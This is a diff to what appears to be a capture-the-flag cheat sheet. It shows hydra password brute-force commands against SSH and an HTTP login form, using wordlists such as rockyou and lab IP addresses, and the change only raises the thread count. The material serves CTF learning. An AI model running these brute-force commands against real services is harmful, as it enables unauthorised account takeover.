@@ -34,14 +34,14 @@ nikto -h [Target IP Address]
 > Let's try to crack the usernames we found with a brute force attack.
 
 ```
-hydra -l [Username We Found] -P [../wordlist.txt] [Whichever Port is Open]://[Target IP Address] -t 50
+hydra -l [Username We Found] -P [../wordlist.txt] [Whichever Port is Open]://[Target IP Address] -t 64
 hydra -l [Username We Found] -P [../wordlist.txt] http-post-form "[HTTP Post Form]" -v
 hydra -L [../Userlist.txt] -P [../wordlist.txt] [Target IP Address] [Whichever Port is Open]://[Target IP Address]
 ```
 > For example:
 
 ```
-hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 50
+hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 64
 hydra -l james -P /home/kali/Downloads/givenbyctf.txt http-post-form "/admin/:user=^USER^&pass=^PASS^:F=invalid" -v
 hydra -L /home/kali/Documents/CTF's/attactive-directory/userlist.txt -P /usr/share/wordlists/fasttrack.txt 10.10.10.10 ssh://10.10.10.10
 ```
